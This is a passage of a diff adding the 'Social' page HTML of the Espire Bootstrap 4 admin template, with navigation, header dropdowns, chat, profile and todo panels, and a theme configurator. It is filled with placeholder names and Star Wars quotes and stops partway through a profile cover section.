@@ -1,0 +1,1458 @@
+<!DOCTYPE html>
+<html>
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+    <title>Espire - Bootstrap 4 Admin Template</title>
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="assets/images/logo/favicon.png">
+
+    <!-- plugins css -->
+    <link rel="stylesheet" href="../bower_components/bootstrap/dist/css/bootstrap.css" />
+    <link rel="stylesheet" href="../bower_components/PACE/themes/blue/pace-theme-minimal.css" />
+    <link rel="stylesheet" href="../bower_components/perfect-scrollbar/css/perfect-scrollbar.min.css" />
+
+    <!-- core css -->
+    <link href="assets/css/ei-icon.css" rel="stylesheet">
+    <link href="assets/css/themify-icons.css" rel="stylesheet">
+    <link href="assets/css/font-awesome.min.css" rel="stylesheet">
+    <link href="assets/css/animate.min.css" rel="stylesheet">
+    <link href="assets/css/app.css" rel="stylesheet">
+</head>
+
+<body>
+    <div class="app">
+        <div class="layout">
+            <!-- Side Nav START -->
+            <div class="side-nav">
+                <div class="side-nav-inner">
+                    <div class="side-nav-logo">
+                        <a href="index.html">
+                            <div class="logo logo-dark" style="background-image: url('assets/images/logo/logo.png')"></div>
+                            <div class="logo logo-white" style="background-image: url('assets/images/logo/logo-white.png')"></div>
+                        </a>
+                        <div class="mobile-toggle side-nav-toggle">
+                            <a href="#">
+                                <i class="ti-arrow-circle-left"></i>
+                            </a>
+                        </div>
+                    </div>
+                    <ul class="side-nav-menu scrollable">
+                        <li class="nav-item">
+                            <a class="mrg-top-30" href="index.html">
+                                <span class="icon-holder">
+										<i class="ti-home"></i>
+									</span>
+                                <span class="title">Dashboard</span>
+                            </a>
+                        </li>
+                        <li class="nav-item dropdown open">
+                            <a class="dropdown-toggle" href="javascript:void(0);">
+                                <span class="icon-holder">
+										<i class="ti-package"></i>
+									</span>
+                                <span class="title">Apps</span>
+                                <span class="arrow">
+										<i class="ti-angle-right"></i>
+									</span>
+                            </a>
+                            <ul class="dropdown-menu">
+                                <li>
+                                    <a href="email.html">Email</a>
+                                </li>
+                                <li>
+                                    <a href="calendar.html">Calendar</a>
+                                </li>
+                                <li class="active">
+                                    <a href="social.html">Social</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="nav-item dropdown">
+                            <a class="dropdown-toggle" href="javascript:void(0);">
+                                <span class="icon-holder">
+										<i class="ti-palette"></i>
+									</span>
+                                <span class="title">UI Elements</span>
+                                <span class="arrow">
+										<i class="ti-angle-right"></i>
+									</span>
+                            </a>
+                            <ul class="dropdown-menu">
+                                <li>
+                                    <a href="cards.html">Cards</a>
+                                </li>
+                                <li>
+                                    <a href="buttons.html">Buttons</a>
+                                </li>
+                                <li>
+                                    <a href="modals.html">Modals</a>
+                                </li>
+                                <li>
+                                    <a href="tabs.html">Tabs &amp; Accordions</a>
+                                </li>
+                                <li>
+                                    <a href="progress-slider.html">Progress &amp; Slider</a>
+                                </li>
+                                <li>
+                                    <a href="notification.html">Notification</a>
+                                </li>
+                                <li>
+                                    <a href="typography.html">Typography</a>
+                                </li>
+                                <li>
+                                    <a href="icons.html">Icons</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="nav-item dropdown">
+                            <a class="dropdown-toggle" href="javascript:void(0);">
+                                <span class="icon-holder">
+										<i class="ti-file"></i>
+									</span>
+                                <span class="title">Forms</span>
+                                <span class="arrow">
+										<i class="ti-angle-right"></i>
+									</span>
+                            </a>
+                            <ul class="dropdown-menu">
+                                <li>
+                                    <a href="form-elements.html">Form Elements</a>
+                                </li>
+                                <li>
+                                    <a href="form-layouts.html">Form Layouts</a>
+                                </li>
+                                <li>
+                                    <a href="form-wizard.html">Form Wizard</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="nav-item dropdown">
+                            <a class="dropdown-toggle" href="javascript:void(0);">
+                                <span class="icon-holder">
+										<i class="ti-layout-media-overlay"></i>
+									</span>
+                                <span class="title">Tables</span>
+                                <span class="arrow">
+										<i class="ti-angle-right"></i>
+									</span>
+                            </a>
+                            <ul class="dropdown-menu">
+                                <li>
+                                    <a href="basic-table.html">Basic Table</a>
+                                </li>
+                                <li>
+                                    <a href="data-table.html">Data Table</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="nav-item dropdown">
+                            <a class="dropdown-toggle" href="javascript:void(0);">
+                                <span class="icon-holder">
+										<i class="ti-pie-chart"></i>
+									</span>
+                                <span class="title">Charts</span>
+                                <span class="arrow">
+										<i class="ti-angle-right"></i>
+									</span>
+                            </a>
+                            <ul class="dropdown-menu">
+                                <li>
+                                    <a href="nvd3.html">Nvd3</a>
+                                </li>
+                                <li>
+                                    <a href="chartjs.html">ChartJs</a>
+                                </li>
+                                <li>
+                                    <a href="sparkline.html">Sparkline</a>
+                                </li>
+                                <li>
+                                    <a href="rickshaw.html">Ricksaw</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="nav-item dropdown">
+                            <a class="dropdown-toggle" href="javascript:void(0);">
+                                <span class="icon-holder">
+										<i class="ti-map-alt"></i>
+									</span>
+                                <span class="title">Map</span>
+                                <span class="arrow">
+										<i class="ti-angle-right"></i>
+									</span>
+                            </a>
+                            <ul class="dropdown-menu">
+                                <li>
+                                    <a href="google-map.html">Google Map</a>
+                                </li>
+                                <li>
+                                    <a href="vector-map.html">Vector Map</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="nav-item dropdown">
+                            <a class="dropdown-toggle" href="javascript:void(0);">
+                                <span class="icon-holder">
+										<i class="ti-cloud"></i>
+									</span>
+                                <span class="title">Extra</span>
+                                <span class="arrow">
+										<i class="ti-angle-right"></i>
+									</span>
+                            </a>
+                            <ul class="dropdown-menu">
+                                <li>
+                                    <a href="invoice.html">Invoice</a>
+                                </li>
+                                <li>
+                                    <a href="account.html">Account Settings</a>
+                                </li>
+                                <li>
+                                    <a href="faq.html">FAQ</a>
+                                </li>
+                                <li>
+                                    <a href="gallery.html">Gallery</a>
+                                </li>
+                                <li>
+                                    <a href="sign-in.html">Sign In</a>
+                                </li>
+                                <li>
+                                    <a href="sign-in2.html">Sign In 2</a>
+                                </li>
+                                <li>
+                                    <a href="sign-up.html">Sign Up</a>
+                                </li>
+                                <li>
+                                    <a href="404.html">404</a>
+                                </li>
+                                <li>
+                                    <a href="500.html">500</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="nav-item dropdown">
+                            <a class="dropdown-toggle" href="javascript:void(0);">
+                                <span class="icon-holder">
+										<i class="ti-view-list-alt"></i>
+									</span>
+                                <span class="title">Multiple Levels</span>
+                                <span class="arrow">
+										<i class="ti-angle-right"></i>
+									</span>
+                            </a>
+                            <ul class="dropdown-menu">
+                                <li class="nav-item dropdown">
+                                    <a href="javascript:void(0);">
+                                        <span>Level 1.2</span>
+                                    </a>
+                                </li>
+                                <li class="nav-item dropdown">
+                                    <a href="javascript:void(0);">
+                                        <span>Level 1.1</span>
+                                        <span class="arrow">
+												<i class="ti-angle-right"></i>
+											</span>
+                                    </a>
+                                    <ul class="dropdown-menu">
+                                        <li>
+                                            <a href="javascript:void(0);">Level 2</a>
+                                        </li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            <!-- Side Nav END -->
+
+            <!-- Page Container START -->
+            <div class="page-container">
+                <!-- Header START -->
+                <div class="header navbar">
+                    <div class="header-container">
+                        <ul class="nav-left">
+                            <li>
+                                <a class="side-nav-toggle" href="javascript:void(0);">
+                                    <i class="ti-view-grid"></i>
+                                </a>
+                            </li>
+                            <li class="search-box">
+                                <a class="search-toggle no-pdd-right" href="javascript:void(0);">
+                                    <i class="search-icon ti-search pdd-right-10"></i>
+                                    <i class="search-icon-close ti-close pdd-right-10"></i>
+                                </a>
+                            </li>
+                            <li class="search-input">
+                                <input class="form-control" type="text" placeholder="Search...">
+                                <div class="advanced-search">
+                                    <div class="search-wrapper">
+                                        <div class="pdd-vertical-10">
+                                            <span class="display-block mrg-vertical-5 pdd-horizon-20 text-gray">
+													<i class="ti-user pdd-right-5"></i>
+													<span>People</span>
+                                            </span>
+                                            <ul class="list-unstyled list-info">
+                                                <li>
+                                                    <a href="#">
+                                                        <img class="thumb-img" src="assets/images/avatars/thumb-1.jpg" alt="">
+                                                        <div class="info">
+                                                            <span class="title">Jordan Hurst</span>
+                                                            <span class="sub-title">
+																	<i class="ti-location-pin"></i>
+																	<span>44 Shirley Ave. West Chicago</span>
+                                                            </span>
+                                                        </div>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="#">
+                                                        <img class="thumb-img" src="assets/images/avatars/thumb-5.jpg" alt="">
+                                                        <div class="info">
+                                                            <span class="title">Jennifer Watkins</span>
+                                                            <span class="sub-title">
+																	<i class="ti-location-pin"></i>
+																	<span>514 S. Magnolia St. Orlando</span>
+                                                            </span>
+                                                        </div>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="#">
+                                                        <img class="thumb-img" src="assets/images/avatars/thumb-4.jpg" alt="">
+                                                        <div class="info">
+                                                            <span class="title">Michael Birch</span>
+                                                            <span class="sub-title">
+																	<i class="ti-location-pin"></i>
+																	<span>70 Bowman St. South Windsor</span>
+                                                            </span>
+                                                        </div>
+                                                    </a>
+                                                </li>
+                                            </ul>
+                                        </div>
+                                        <div class="mrg-horizon-20 border top"></div>
+                                        <div class="pdd-vertical-10">
+                                            <span class="display-block mrg-vertical-5 pdd-horizon-20 text-gray">
+													<i class="ti-rss pdd-right-5"></i>
+													<span>Post</span>
+                                            </span>
+                                            <ul class="list-unstyled list-info">
+                                                <li>
+                                                    <a href="#">
+                                                        <img class="thumb-img" src="assets/images/img-1.jpg" alt="">
+                                                        <div class="info">
+                                                            <span class="title">Artoo expresses his relief</span>
+                                                            <span class="sub-title">
+																	<span>Oh, thank goodness we're coming out...</span>
+                                                            </span>
+                                                        </div>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="#">
+                                                        <img class="thumb-img" src="assets/images/img-2.jpg" alt="">
+                                                        <div class="info">
+                                                            <span class="title">Ready for some power?</span>
+                                                            <span class="sub-title">
+																	<span>Lord Vader. You may take Caption So...</span>
+                                                            </span>
+                                                        </div>
+                                                    </a>
+                                                </li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                    <div class="search-footer">
+                                        <span>You are Searching for '<b class="text-dark"><span class="serach-text-bind"></span></b>'</span>
+                                    </div>
+                                </div>
+                            </li>
+                        </ul>
+                        <ul class="nav-right">
+                            <li class="user-profile dropdown">
+                                <a href="#" class="dropdown-toggle" data-toggle="dropdown">
+                                    <img class="profile-img img-fluid" src="assets/images/user.jpg" alt="">
+                                    <div class="user-info">
+                                        <span class="name pdd-right-5">Nate Leong</span>
+                                        <i class="ti-angle-down font-size-10"></i>
+                                    </div>
+                                </a>
+                                <ul class="dropdown-menu">
+                                    <li>
+                                        <a href="#">
+                                            <i class="ti-settings pdd-right-10"></i>
+                                            <span>Setting</span>
+                                        </a>
+                                    </li>
+                                    <li>
+                                        <a href="#">
+                                            <i class="ti-user pdd-right-10"></i>
+                                            <span>Profile</span>
+                                        </a>
+                                    </li>
+                                    <li>
+                                        <a href="#">
+                                            <i class="ti-email pdd-right-10"></i>
+                                            <span>Inbox</span>
+                                        </a>
+                                    </li>
+                                    <li role="separator" class="divider"></li>
+                                    <li>
+                                        <a href="#">
+                                            <i class="ti-power-off pdd-right-10"></i>
+                                            <span>Logout</span>
+                                        </a>
+                                    </li>
+                                </ul>
+                            </li>
+                            <li class="notifications dropdown">
+                                <span class="counter">2</span>
+                                <a href="#" class="dropdown-toggle" data-toggle="dropdown">
+                                    <i class="ti-bell"></i>
+                                </a>
+
+                                <ul class="dropdown-menu ">
+                                    <li class="notice-header">
+                                        <i class="ti-bell pdd-right-10"></i>
+                                        <span>Notifications</span>
+                                    </li>
+                                    <li>
+                                        <ul class="list-info overflow-y-auto relative scrollable">
+                                            <li>
+                                                <a href="#">
+                                                    <img class="thumb-img" src="assets/images/avatars/thumb-5.jpg" alt="">
+                                                    <div class="info">
+                                                        <span class="title">
+															<span class="font-size-14 text-semibold">Jennifer Watkins</span>
+                                                        <span class="text-gray">commented on your <span class="text-dark">post</span></span>
+                                                        </span>
+                                                        <span class="sub-title">5 mins ago</span>
+                                                    </div>
+                                                </a>
+                                            </li>
+                                            <li>
+                                                <a href="#">
+                                                    <img class="thumb-img" src="assets/images/avatars/thumb-4.jpg" alt="">
+                                                    <div class="info">
+                                                        <span class="title">
+															<span class="font-size-14 text-semibold">Samuel Field</span>
+                                                        <span class="text-gray">likes your <span class="text-dark">photo</span></span>
+                                                        </span>
+                                                        <span class="sub-title">8 hours ago</span>
+                                                    </div>
+                                                </a>
+                                            </li>
+                                            <li>
+                                                <a href="#">
+                                                    <span class="thumb-img bg-primary">
+															<span class="text-white">M</span>
+                                                    </span>
+                                                    <div class="info">
+                                                        <span class="title">
+															<span class="font-size-14 text-semibold">Michael Birch</span>
+                                                        <span class="text-gray">likes your <span class="text-dark">photo</span></span>
+                                                        </span>
+                                                        <span class="sub-title">5 hours ago</span>
+                                                    </div>
+                                                </a>
+                                            </li>
+                                            <li>
+                                                <a href="#">
+                                                    <span class="thumb-img bg-success">
+														<span class="text-white"><i class="fa fa-paper-plane-o"></i></span>
+                                                    </span>
+                                                    <div class="info">
+                                                        <span class="title">
+															<span class="font-size-14 text-semibold">Message sent</span>
+                                                        </span>
+                                                        <span class="sub-title">8 hours ago</span>
+                                                    </div>
+                                                </a>
+                                            </li>
+                                            <li>
+                                                <a href="#">
+                                                    <span class="thumb-img bg-info">
+														<span class="text-white"><i class="ti-user"></i></span>
+                                                    </span>
+                                                    <div class="info">
+                                                        <span class="title">
+															<span class="font-size-14 text-semibold">Admin</span>
+                                                        <span class="text-gray">Welcome on board</span>
+                                                        </span>
+                                                        <span class="sub-title">8 hours ago</span>
+                                                    </div>
+                                                </a>
+                                            </li>
+                                        </ul>
+                                    </li>
+
+                                    <li class="notice-footer">
+                                        <span>
+                                            <a href="#" class="text-gray">Check all notifications <i class="ei-right-chevron pdd-left-5 font-size-10"></i></a>
+										</span>
+                                    </li>
+                                </ul>
+                            </li>
+                            <li>
+                                <a class="side-panel-toggle" href="javascript:void(0);">
+                                    <i class="ti-align-right"></i>
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+                <!-- Header END -->
+
+                <!-- Side Panel START -->
+                <div class="side-panel">
+                    <div class="side-panel-wrapper bg-white">
+                        <ul class="nav nav-tabs" role="tablist">
+                            <li class="nav-item active">
+                                <a class="nav-link" href="#chat" role="tab" data-toggle="tab">
+                                    <span>Chat</span>
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a class="nav-link" href="#profile" role="tab" data-toggle="tab">
+                                    <span>Profile</span>
+                                </a>
+                            </li>
+                            <li class="nav-item ">
+                                <a class="nav-link" href="#todo-list" role="tab" data-toggle="tab">
+                                    <span>Todo</span>
+                                </a>
+                            </li>
+                            <li class="panel-close">
+                                <a class="side-panel-toggle" href="javascript:void(0);">
+                                    <i class="ti-close"></i>
+                                </a>
+                            </li>
+                        </ul>
+                        <div class="tab-content">
+                            <!-- chat START -->
+                            <div id="chat" role="tabpanel" class="tab-pane fade in active">
+                                <div class="chat">
+                                    <div class="chat-user-list scrollable">
+                                        <div class="chat-section">
+                                            <h5 class="chat-title">Recent</h5>
+                                            <a href="javascript:void(0);" class="chat-user chat-toggle">
+                                                <img class="thumb-img" src="assets/images/avatars/thumb-1.jpg" alt="">
+                                                <div class="user-info">
+                                                    <span class="user-name">Jordan Hurst</span>
+                                                    <span class="prev-chat">What good's a reward if...</span>
+                                                </div>
+                                                <span class="status online"><span></span></span>
+                                            </a>
+                                            <a href="javascript:void(0);" class="chat-user chat-toggle">
+                                                <img class="thumb-img" src="assets/images/avatars/thumb-2.jpg" alt="">
+                                                <div class="user-info">
+                                                    <span class="user-name">Harriet Douglas</span>
+                                                    <span class="prev-chat">Don't talk to me, stranger...</span>
+                                                </div>
+                                                <span class="status no-disturb"></span>
+                                            </a>
+                                            <a href="javascript:void(0);" class="chat-user chat-toggle">
+                                                <img class="thumb-img" src="assets/images/avatars/thumb-3.jpg" alt="">
+                                                <div class="user-info">
+                                                    <span class="user-name">Victoria Clayton</span>
+                                                    <span class="prev-chat">Well, the Force is what...</span>
+                                                </div>
+                                                <span class="status away"></span>
+                                            </a>
+                                            <a href="javascript:void(0);" class="chat-user chat-toggle">
+                                                <img class="thumb-img" src="assets/images/avatars/thumb-6.jpg" alt="">
+                                                <div class="user-info">
+                                                    <span class="user-name">Michael Birch</span>
+                                                    <span class="prev-chat">Good. Use your aggressive...</span>
+                                                </div>
+                                                <span class="status online"></span>
+                                            </a>
+                                        </div>
+                                        <div class="chat-section">
+                                            <h5 class="chat-title">Members</h5>
+                                            <a href="javascript:void(0);" class="chat-user chat-toggle">
+                                                <img class="thumb-img" src="assets/images/avatars/thumb-4.jpg" alt="">
+                                                <div class="user-info">
+                                                    <span class="user-name pdd-top-5">Samuel Field</span>
+                                                </div>
+                                                <span class="status"></span>
+                                            </a>
+                                            <a href="javascript:void(0);" class="chat-user chat-toggle">
+                                                <img class="thumb-img" src="assets/images/avatars/thumb-5.jpg" alt="">
+                                                <div class="user-info">
+                                                    <span class="user-name pdd-top-5">Jennifer Watkins</span>
+                                                </div>
+                                                <span class="status"></span>
+                                            </a>
+                                            <a href="javascript:void(0);" class="chat-user chat-toggle">
+                                                <img class="thumb-img" src="assets/images/avatars/thumb-6.jpg" alt="">
+                                                <div class="user-info">
+                                                    <span class="user-name pdd-top-5">Michael Birch</span>
+                                                </div>
+                                                <span class="status"></span>
+                                            </a>
+                                            <a href="javascript:void(0);" class="chat-user chat-toggle">
+                                                <img class="thumb-img" src="assets/images/avatars/thumb-10.jpg" alt="">
+                                                <div class="user-info">
+                                                    <span class="user-name pdd-top-5">Renee Edwards</span>
+                                                </div>
+                                                <span class="status"></span>
+                                            </a>
+                                            <a href="javascript:void(0);" class="chat-user chat-toggle">
+                                                <img class="thumb-img" src="assets/images/avatars/thumb-11.jpg" alt="">
+                                                <div class="user-info">
+                                                    <span class="user-name pdd-top-5">Kathy White</span>
+                                                </div>
+                                                <span class="status"></span>
+                                            </a>
+                                            <a href="javascript:void(0);" class="chat-user chat-toggle">
+                                                <img class="thumb-img" src="assets/images/avatars/thumb-9.jpg" alt="">
+                                                <div class="user-info">
+                                                    <span class="user-name pdd-top-5">Daryl Ellis</span>
+                                                </div>
+                                                <span class="status"></span>
+                                            </a>
+                                        </div>
+                                    </div>
+                                    <div class="conversation">
+                                        <div class="conversation-wrapper">
+                                            <div class="conversation-header">
+                                                <a href="javascript:void(0);" class="back chat-toggle">
+                                                    <i class="ti-arrow-circle-left"></i>
+                                                </a>
+                                                <span class="user-name">Jordan Hurst</span>
+                                            </div>
+                                            <div class="conversation-body">
+                                                <div class="msg">
+                                                    <div class="bubble me">
+                                                        <span>Feeling all right, sir?</span>
+                                                    </div>
+                                                </div>
+                                                <div class="msg">
+                                                    <div class="bubble friend">
+                                                        <span>Just like new</span>
+                                                    </div>
+                                                </div>
+                                                <div class="msg">
+                                                    <div class="bubble friend">
+                                                        <span>How about you?</span>
+                                                    </div>
+                                                </div>
+                                                <div class="msg">
+                                                    <div class="bubble me">
+                                                        <span>Right now I feel I could take on the whole Empire myself</span>
+                                                    </div>
+                                                </div>
+                                                <div class="msg">
+                                                    <div class="bubble friend">
+                                                        <span>All right</span>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="conversation-footer">
+                                                <button class="upload-btn">
+                                                    <i class="ti-camera"></i>
+                                                </button>
+                                                <input class="chat-input" type="text" placeholder="Type a message...">
+                                                <button class="sent-btn">
+                                                    <i class="fa fa-send-o"></i>
+                                                </button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- chat END -->
+                            <!-- profile START -->
+                            <div id="profile" role="tabpanel" class="tab-pane fade">
+                                <div class="profile scrollable">
+                                    <div class="pdd-horizon-20 pdd-top-20">
+                                        <div class="border bottom">
+                                            <div class="text-center mrg-top-20">
+                                                <div class="row">
+                                                    <div class="col-md-6 ml-auto mr-auto text-center">
+                                                        <img class="img-fluid border-radius-round" src="assets/images/avatars/user-1.jpg" alt="">
+                                                    </div>
+                                                </div>
+                                                <h4 class="mrg-top-20">Nate Leong</h4>
+                                                <span class="">@Frontend Developer</span>
+                                            </div>
+                                            <div class="row text-center pdd-vertical-20">
+                                                <div class="col-sm-12">
+                                                    <div class="row">
+                                                        <div class="col-sm-4 col-xs-4 border right">
+                                                            <div class="pdd-vertical-10">
+                                                                <span class="font-size-18 text-dark">18</span>
+                                                                <small>Projects</small>
+                                                            </div>
+                                                        </div>
+                                                        <div class="col-sm-4 col-xs-4 border right">
+                                                            <div class="pdd-vertical-10">
+                                                                <span class="font-size-18 text-dark">1,362</span>
+                                                                <small>Followers</small>
+                                                            </div>
+                                                        </div>
+                                                        <div class="col-sm-4 col-xs-4">
+                                                            <div class="pdd-vertical-10">
+                                                                <span class="font-size-18 text-dark">362</span>
+                                                                <small>Points</small>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="pdd-horizon-20 pdd-top-20">
+                                        <div class="border bottom">
+                                            <h5 class="text-dark mrg-btm-20">Quick Tools</h5>
+                                            <ul class="list-unstyled list-link font-size-16 pdd-btm-20">
+                                                <li>
+                                                    <a href="#">
+                                                        <i class="ti-user pdd-right-10"></i>
+                                                        <span>Friend Request</span>
+                                                        <span class="label label-info mrg-left-5">2</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="#">
+                                                        <i class="ti-book pdd-right-10"></i>
+                                                        <span>Inbox</span>
+                                                        <span class="label label-warning mrg-left-5">8</span>
+                                                    </a>
+                                                </li>
+                                                <li>
+                                                    <a href="#">
+                                                        <i class="ti-settings pdd-right-10"></i>
+                                                        <span>Settings</span>
+                                                    </a>
+                                                </li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                    <div class="padding-20">
+                                        <h5 class="text-dark mrg-btm-20">Recent</h5>
+                                        <ul class="list-unstyled list-info">
+                                            <li>
+                                                <a href="#">
+                                                    <img class="thumb-img" src="assets/images/avatars/thumb-1.jpg" alt="">
+                                                    <div class="info">
+                                                        <span class="title">Jordan Hurst</span>
+                                                        <span class="sub-title">have send you a request</span>
+                                                        <span class="float-object">8m</span>
+                                                    </div>
+                                                </a>
+                                            </li>
+                                            <li>
+                                                <a href="#">
+                                                    <img class="thumb-img" src="assets/images/avatars/thumb-4.jpg" alt="">
+                                                    <div class="info">
+                                                        <span class="title">Samuel Field</span>
+                                                        <span class="sub-title">have send you a request</span>
+                                                        <span class="float-object">7d</span>
+                                                    </div>
+                                                </a>
+                                            </li>
+                                            <li>
+                                                <a href="#">
+                                                    <span class="thumb-img bg-info text-center font-size-25 font-secondary">
+															<span class="text-white">E</span>
+                                                    </span>
+                                                    <div class="info">
+                                                        <span class="title">Espire</span>
+                                                        <span class="sub-title">Welcome on Board</span>
+                                                        <span class="float-object">7d</span>
+                                                    </div>
+                                                </a>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- profile END -->
+                            <!-- todo START -->
+                            <div id="todo-list" role="tabpanel" class="tab-pane fade">
+                                <div class="todo-wrapper">
+                                    <div class="todo-category-wrapper">
+                                        <div class="row mrg-btm-15">
+                                            <div class="col-md-12">
+                                                <h3 class="no-mrg-top">Todo List</h3>
+                                            </div>
+                                        </div>
+                                        <a href="javascript:void(0);" class="todo-toggle">
+                                            <div class="todo-category">
+                                                <span class="amount">8</span>
+                                                <span class="category">Today</span>
+                                            </div>
+                                        </a>
+                                        <a href="javascript:void(0);" class="todo-toggle">
+                                            <div class="todo-category">
+                                                <span class="amount">18</span>
+                                                <span class="category">This Week</span>
+                                            </div>
+                                        </a>
+                                        <a href="javascript:void(0);" class="todo-toggle">
+                                            <div class="todo-category">
+                                                <span class="amount">28</span>
+                                                <span class="category">This Month</span>
+                                            </div>
+                                        </a>
+                                        <a href="javascript:void(0);" class="todo-toggle">
+                                            <div class="create-category">
+                                                <i class="amount fa fa-plus-circle"></i>
+                                                <span class="category">New Category</span>
+                                            </div>
+                                        </a>
+                                    </div>
+
+                                    <div class="todolist-wrapper">
+                                        <div class="todolist-header">
+                                            <a href="javascript:void(0);" class="back todo-toggle">
+                                                <i class="ti-arrow-circle-left"></i>
+                                            </a>
+                                            <h3 class="category">This Week</h3>
+                                            <a href="#" class="add">
+                                                <span>ADD</span>
+                                            </a>
+                                        </div>
+                                        <div class="todolist-body">
+                                            <div class="checkbox">
+                                                <button class="delete">
+                                                    <i class="ti-close"></i>
+                                                </button>
+                                                <input id="task1" name="task1" type="checkbox">
+                                                <label for="task1">I hope the old man got that tractor </label>
+                                            </div>
+                                            <div class="checkbox">
+                                                <button class="delete">
+                                                    <i class="ti-close"></i>
+                                                </button>
+                                                <input id="task2" name="task2" type="checkbox">
+                                                <label for="task2">Come on, come on!</label>
+                                            </div>
+                                            <div class="checkbox">
+                                                <button class="delete">
+                                                    <i class="ti-close"></i>
+                                                </button>
+                                                <input id="task3" name="task3" type="checkbox">
+                                                <label for="task3">it was dangerous here</label>
+                                            </div>
+                                            <div class="checkbox">
+                                                <button class="delete">
+                                                    <i class="ti-close"></i>
+                                                </button>
+                                                <input id="task4" name="task4" type="checkbox">
+                                                <label for="task4">I hope the old man got that tractor </label>
+                                            </div>
+                                            <div class="checkbox">
+                                                <button class="delete">
+                                                    <i class="ti-close"></i>
+                                                </button>
+                                                <input id="task5" name="task5" type="checkbox">
+                                                <label for="task5">Artoo! Artoo, quickly!</label>
+                                            </div>
+                                        </div>
+                                        <div class="todolist-body">
+                                            <div class="pdd-btm-5 mrg-btm-15 border bottom">
+                                                <p class="mrg-btm-5">Completed</p>
+                                            </div>
+                                            <div class="checkbox">
+                                                <button class="delete">
+                                                    <i class="ti-close"></i>
+                                                </button>
+                                                <input id="completed-1" name="completed-1" type="checkbox" checked="">
+                                                <label for="completed-1">I hope the old man got that tractor </label>
+                                            </div>
+                                            <div class="checkbox">
+                                                <button class="delete">
+                                                    <i class="ti-close"></i>
+                                                </button>
+                                                <input id="completed-2" name="completed-2" type="checkbox" checked="">
+                                                <label for="completed-2">Come on, come on!</label>
+                                            </div>
+                                            <div class="checkbox">
+                                                <button class="delete">
+                                                    <i class="ti-close"></i>
+                                                </button>
+                                                <input id="completed-3" name="completed-3" type="checkbox" checked="">
+                                                <label for="completed-3">it was dangerous here</label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!-- Side Panel END -->
+
+                <!-- theme configurator START -->
+                <div class="theme-configurator">
+                    <div class="configurator-wrapper">
+                        <div class="config-header">
+                            <h4 class="config-title">Config Panel</h4>
+                            <button class="config-close">
+                                <i class="ti-close"></i>
+                            </button>
+                        </div>
+                        <div class="config-body">
+                            <div class="mrg-btm-30">
+                                <p class="lead font-weight-normal">Header Color</p>
+                                <div class="theme-colors header-default">
+                                    <input type="radio" id="header-default" name="theme">
+                                    <label for="header-default"></label>
+                                </div>
+                                <div class="theme-colors header-primary">
+                                    <input type="radio" class="primary" id="header-primary" name="theme">
+                                    <label for="header-primary"></label>
+                                </div>
+                                <div class="theme-colors header-info">
+                                    <input type="radio" id="header-info" name="theme">
+                                    <label for="header-info"></label>
+                                </div>
+                                <div class="theme-colors header-success">
+                                    <input type="radio" id="header-success" name="theme">
+                                    <label for="header-success"></label>
+                                </div>
+                                <div class="theme-colors header-danger">
+                                    <input type="radio" id="header-danger" name="theme">
+                                    <label for="header-danger"></label>
+                                </div>
+                                <div class="theme-colors header-dark">
+                                    <input type="radio" id="header-dark" name="theme">
+                                    <label for="header-dark"></label>
+                                </div>
+                            </div>
+                            <div class="mrg-btm-30">
+                                <p class="lead font-weight-normal">Sidebar Color</p>
+                                <div class="theme-colors sidenav-default">
+                                    <input type="radio" id="sidenav-default" name="sidenav">
+                                    <label for="sidenav-default"></label>
+                                </div>
+                                <div class="theme-colors side-nav-dark">
+                                    <input type="radio" id="side-nav-dark" name="sidenav">
+                                    <label for="side-nav-dark"></label>
+                                </div>
+                            </div>
+                            <div class="mrg-btm-30">
+                                <p class="lead font-weight-normal no-mrg-btm">RTL</p>
+                                <div class="toggle-checkbox checkbox-inline toggle-sm mrg-top-10">
+                                    <input type="checkbox" name="rtl-toogle" id="rtl-toogle">
+                                    <label for="rtl-toogle"></label>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!-- theme configurator END -->
+
+                <!-- Theme Toggle Button START -->
+                <button class="theme-toggle btn btn-rounded btn-icon">
+                    <i class="ti-palette"></i>
+                </button>
+                <!-- Theme Toggle Button END -->
+
+                <!-- Content Wrapper START -->
+                <div class="main-content">
+                    <div class="container-fluid">
+                        <div class="social">
+                            <div class="container-fluid">
+                                <div class="social-cover card">
+                                    <div class="cover-img overlay-dark bg" style="background-image: url('assets/images/others/img-9.jpg')">
+                                        <div class="cover-content">
+                                            <div class="text-center border bottom border-hide-sm pdd-horizon-30 pdd-btm-10">
+                                                <h1 class="no-mrg-btm">Victoria Clayton</h1>
+                                                <p>UI/UX Designer</p>
+                                            </div>
+                                            <div class="row mrg-top-15">
+                                                <div class="col-md-6 border right border-hide-sm">
+                                                    <div class="text-center">
+                                                        <h3 class="no-mrg">168</h3>
+                                                        <span>Follower</span>
+                                                    </div>
+                                                </div>
+                                                <div class="col-md-6">
+                                                    <div class="pdd-horizon-15">
